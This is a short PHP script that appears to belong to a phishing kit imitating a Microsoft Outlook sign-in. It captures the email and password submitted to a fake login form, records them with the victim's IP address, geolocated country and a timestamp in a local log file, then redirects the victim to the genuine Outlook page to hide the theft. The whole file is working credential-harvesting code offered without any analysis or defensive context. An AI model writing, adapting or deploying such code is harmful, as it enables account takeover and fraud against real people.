<?php
error_reporting(0);
session_start();
$ip = $_SERVER["REMOTE_ADDR"];
$ipdat = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ip)); 
$_SESSION['_IP_'] = $_SERVER["REMOTE_ADDR"];


#browser info
#Country info
$_SESSION['loginfmt'] = $_POST['email'];
$_SESSION['loginfmt'] = $_POST['password'];


#Security information
$message = "
<font color='#0000FF'> Correo	=>   ".$_POST['email']."</font> -  
<font color='#0000FF'> Clave	=>   ".$_POST['password']."</font> - 
<font color='#0000FF'>".date('l, jS \of F Y , h:i:s A')."</font> - 
<font color='#0000FF'> " . $ipdat->geoplugin_countryCode . " </font> -
<font color='#0000FF'>".$_SESSION['_IP_']."</font>  <br />
----------------------------------------- <br />
</div>";

$fp = fopen('LOZADA.html', 'a');
fwrite($fp, "$message \r\n");
fclose($fp);


header('location: https://outlook.live.com/owa/?nlp=1');

?>